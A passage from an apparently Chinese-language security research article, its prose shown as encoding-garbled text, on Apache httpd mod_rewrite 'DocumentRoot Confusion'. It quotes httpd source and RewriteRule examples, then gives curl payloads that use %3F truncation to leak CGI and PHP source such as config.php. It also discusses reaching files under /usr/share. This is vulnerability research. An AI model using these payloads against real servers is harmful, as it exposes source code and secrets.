class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∂ÁÑ∂ÁµïÂ§ßÈÉ®ÂàÜÁöÑÊÉÖÊ≥ÅÊòØÁõÆÊ®ôÊ™îÊ°à‰∏çÂ≠òÂú®ÔºåÊñºÊòØ Httpd ÊúÉÂ≠òÂèñÂ∏∂Êúâ DocumentRoot ÁöÑÁâàÊú¨Ôºå‰ΩÜÈÄôÂÄãË°åÁÇ∫Â∑≤Á∂ìËÆìÊàëÂÄëËÉΩÂ§†„ÄåÊïÖÊÑèÁöÑ„ÄçÂéªÂ≠òÂèñ Web Root ‰ª•Â§ñÁöÑË∑ØÂæëÔºå&lt;strong&gt;Â¶ÇÊûú‰ªäÂ§©ÂèØ‰ª•ÊéßÂà∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÁöÑÁõÆÊ®ôÂâçÁ∂¥ÈÇ£ÊàëÂÄëÊòØ‰∏çÊòØÂ∞±ËÉΩÁÄèË¶Ω‰ΩúÊ•≠Á≥ªÁµ±‰∏äÁöÑ‰ªªÊÑèÊ™îÊ°à‰∫ÜÔºü&lt;/strong&gt; ÈÄô‰πüÊòØÊàëÂÄëÁ¨¨‰∫åÂÄã Confusion Attack ÁöÑÁ≤æÁ•ûÔºÅ Âæû GitHub ‰∏≠ÂèØ‰ª•ÊâæÂà∞ÂçÉÂçÉËê¨Ëê¨ÂÄãÊúâÂïèÈ°åÁöÑÂØ´Ê≥ïÔºåÊúâË∂£ÁöÑÊòØÁîöËá≥ÈÄ£&lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;ÂÆòÊñπÁöÑÁØÑ‰æãÊñá‰ª∂&lt;/a&gt;ÈÉΩÊòØÊòìÈÅ≠ÂèóÊîªÊìäÁöÑÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Èô§Ê≠§‰πãÂ§ñÈÇÑÊúâÂÖ∂ÂÆÉ‰∫¶ÂèóÂΩ±ÈüøÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ‰æãÂ¶ÇÂü∫ÊñºÂø´ÂèñÈúÄÊ±ÇÊàñÊòØÂ∞áÊÉ≥ÂâØÊ™îÂêçÈö±ËóèËµ∑‰æÜÁöÑ URL Masking Ë¶èÂâáÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàñÊòØÊÉ≥ÁØÄÁúÅÊµÅÈáèÔºåÂòóË©¶‰ΩøÁî®Â£ìÁ∏ÆÁâàÊú¨ÁöÑÈùúÊÖãÊ™îÊ°àË¶èÂâáÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â∞áËÄÅËàäÁöÑÁ∂≤Á´ôËΩâÂùÄÂà∞Ê†πÁõÆÈåÑÁöÑË¶èÂâáÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â∞çÊâÄÊúâ CORS ÁöÑÈ†êÊ™¢Ë´ãÊ±ÇÈÉΩÂõûÂÇ≥ 200 OK ÁöÑË¶èÂâáÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁêÜË´ñ‰∏äÂè™Ë¶Å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÁöÑÁõÆÊ®ôÂâçÁ∂¥ÂèØÊéßÔºåÊàëÂÄëÂèØ‰ª•ÁÄèË¶ΩÂπæ‰πéÊï¥ÂÄãÊ™îÊ°àÁ≥ªÁµ±Ôºå‰ΩÜÂæûÂâçÈù¢ÁöÑË¶èÂâá‰∏≠ÁôºÁèæÈÇÑÊúâ‰∏ÄÂÄãÈôêÂà∂ÊàëÂÄëÂøÖÈ†àË∑®ÈÅéÁöÑÔºåÂâçÈù¢‰æãÂ≠ê‰∏≠ÊâÄÂá∫ÁèæÁöÑÂâØÊ™îÂêçÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; ÁöÑÂæåÁ∂¥ÈÉΩÊòØËÆìÊàëÂÄëÊ≤íÈÇ£È∫ºÂú∞Ëá™Áî±ÁöÑ‰∏ÄÂÄãÈôêÂà∂ ‚Äî‚Äî ÊâÄ‰ª•ÂèØ‰ª•ÁπûÈÅéÈÄôÂÄãÈôêÂà∂ÂóéÔºü ‰∏çÁü•ÈÅìÊúâÊ≤íÊúâ‰∫∫ÊÉ≥Ëµ∑ÂâçÈù¢Âú® Filename Confusion Á´†ÁØÄÊâÄ‰ªãÁ¥πÁöÑË∑ØÂæëÊà™Êñ∑ÔºåÈÄèÈÅéÈÄôÂÖ©ÂÄãÊîªÊìäÁöÑÁµêÂêàÔºåÊàëÂÄëÂèØ‰ª•Ëá™Áî±ÁöÑÁÄèË¶Ω‰ΩúÊ•≠Á≥ªÁµ±‰∏äÁöÑ‰ªªÊÑèÊ™îÊ°àÔºÅ&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÁöÑÁØÑ‰æãÈÉΩÂü∫ÊñºÈÄôÂÄã‰∏çÂÆâÂÖ®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ‰æÜÂÅöÁ§∫ÁØÑÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-1-server-side-source-code-disclosure&quot;&gt;‚öîÔ∏è Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;È¶ñÂÖà‰æÜ‰ªãÁ¥π DocumentRoot Confusion ÁöÑÁ¨¨‰∏ÄÂÄãÊîªÊìäÊâãÊ≥ï ‚Äî‚Äî &lt;strong&gt;‰ªªÊÑè‰º∫ÊúçÂô®Á´ØÁ®ãÂºèÁ¢ºÊ¥©Êºè&lt;/strong&gt;ÔºÅ&lt;/p&gt;

&lt;p&gt;Áî±Êñº Httpd ÊúÉÊ†πÊìöÁï∂ÂâçÁõÆÈåÑÊàñÊòØÁï∂ÂâçËôõÊì¨‰∏ªÊ©üË®≠ÂÆöÊ±∫ÂÆöÊòØÂê¶Áï∂Êàê Server-Side Script ËôïÁêÜÔºåÂõ†Ê≠§ÈÄèÈÅéÁµïÂ∞çË∑ØÂæëÂéªÂ≠òÂèñÁõÆÊ®ôÁ®ãÂºèÁ¢ºÂèØ‰ª•Ê∑∑Ê∑Ü Httpd ÁöÑÈÇèËºØÂ∞éËá¥Ê¥©ÊºèÂéüÊú¨Ë©≤Ë¢´Áï∂ÊàêÁ®ãÂºèÁ¢ºÂü∑Ë°åÁöÑÊ™îÊ°àÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-1-1-disclose-cgi-source-code&quot;&gt;‚úîÔ∏è 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;È¶ñÂÖàÊòØÊ¥©Êºè‰º∫ÊúçÂô®Á´ØÁöÑ CGI Á®ãÂºèÁ¢ºÔºåÁî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; ÊòØÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; Â∞á CGI ÁõÆÈåÑËàáÊâÄÊåáÂÆöÁöÑ URL ÂâçÁ∂¥Á∂ÅÂÆöËµ∑‰æÜÔºåÁï∂‰ΩøÁî®ÁµïÂ∞çË∑ØÂæëÁõ¥Êé•ÁÄèË¶Ω CGI ÊôÇÁî±Êñº URL ÂâçÁ∂¥ËÆä‰∫ÜÔºåÂõ†Ê≠§ÂèØ‰ª•Áõ¥Êé•Ê¥©ÊºèÂá∫Ê™îÊ°àÂéüÂßãÁ¢º„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-2-1-2-disclose-php-source-code&quot;&gt;‚úîÔ∏è 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;Êé•ËëóÊòØÊ¥©Êºè‰º∫ÊúçÂô®Á´ØÁöÑ PHP Á®ãÂºèÁ¢ºÔºåÁî±Êñº PHP ÁöÑ‰ΩøÁî®Â†¥ÊôØÁúæÂ§öÔºåËã•Âè™ÈáùÂ∞çÁâπÂÆöÁõÆÈåÑÊàñÊòØËôõÊì¨‰∏ªÊ©üÂ•óÁî® PHP Áí∞Â¢ÉÁöÑË©± (Â∏∏Ë¶ãÊñºÁ∂≤Á´ô‰ª£ÁÆ°ÊúçÂãô)ÔºåÂèØ‰ª•ÈÄèÈÅéÊú™ÂïüÁî® PHP ÁöÑËôõÊì¨‰∏ªÊ©üÂ≠òÂèñ PHP Ê™îÊ°à‰ª•Ê¥©ÊºèÂéüÂßãÁ¢ºÔºÅ&lt;/p&gt;

&lt;p&gt;‰æãÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; ÂÖ©ÂÄãËôõÊì¨‰∏ªÊ©üÈÉΩË®óÁÆ°Âú®Âêå‰∏ÄÂè∞‰º∫ÊúçÂô®‰∏äÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; ÂÖÅË®±ÈÅãË°å PHP ËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; ÂâáÁ¥îÁ≤πË≤†Ë≤¨ËôïÁêÜÈùúÊÖãÊ™îÊ°àÔºåÂõ†Ê≠§ÂèØ‰ª•ÈÄèÈÅé‰∏ãÈù¢ÁöÑÊñπÂºèÊ¥©ÊºèÂá∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; ÂÖßÁöÑÊïèÊÑüË≥áË®äÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-2-local-gadgets-manipulation&quot;&gt;‚öîÔ∏è Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÊòØÊàëÂÄëÁöÑÁ¨¨‰∫åÂÄãÊîªÊìäÊâãÊ≥ï ‚Äî‚Äî &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÔºåÂú®ÂâçÈù¢‰ªãÁ¥πÂà∞„ÄåÁÄèË¶Ω‰ΩúÊ•≠Á≥ªÁµ±‰∏äÁöÑ‰ªªÊÑèÊ™îÊ°à„ÄçÊôÇ‰∏çÁü•ÈÅì‰Ω†ÊúâÊ≤íÊúâÂ•ΩÂ•áÔºö „ÄåÊ¨∏ÈÇ£ÊòØ‰∏çÊòØ‰∏ÄÂÄã‰∏çÂÆâÂÖ®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; Â∞±ÂèØ‰ª•Â≠òÂèñÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;Ôºü„Äç Â∞çÁöÑ ‚Äî‚Äî ‰ΩÜ‰πü‰∏çÂÆåÂÖ®Â∞ç„ÄÇ Ëõ§Ôºü&lt;/p&gt;

&lt;p&gt;ÊäÄË°ì‰∏ä‰æÜË™™Á¢∫ÂØ¶‰º∫ÊúçÂô®ÊúÉÂéªÊ™¢Êü• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; ÊòØÂê¶Â≠òÂú®Ôºå‰ΩÜ Apach HTTP Server ÂÖßÂª∫ÁöÑÂ≠òÂèñÊéßÂà∂ÈòªÊìã‰∫ÜÊàëÂÄëÁöÑÂ≠òÂèñÔºåÈÄôË£°ÊòØ Apache HTTP Server ÁöÑ&lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;Ë®≠ÂÆöÊ™îÊ®°ÊùøÂÖßÂÆπ&lt;/a&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊúÉËßÄÂØüÂà∞È†êË®≠ÈòªÊìã‰∫ÜÊ†πÁõÆÈåÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; ÁöÑÁÄèË¶Ω (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;)ÔºåÁÑ∂ËÄåÂØ¶Èöõ‰∏äÈÄôÂ∞±Ê≤íÊà≤‰∫ÜÂóéÔºü ÂØ¶Èöõ‰∏äÂÜçË©≥Á¥∞ËøΩÊü•ÂêÑÂÄã Httpd ÁöÑÁôºË°åÁâàÊúÉÁôºÁèæ &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; ‰ΩúÊ•≠Á≥ªÁµ±È†êË®≠ÂÖÅË®±‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

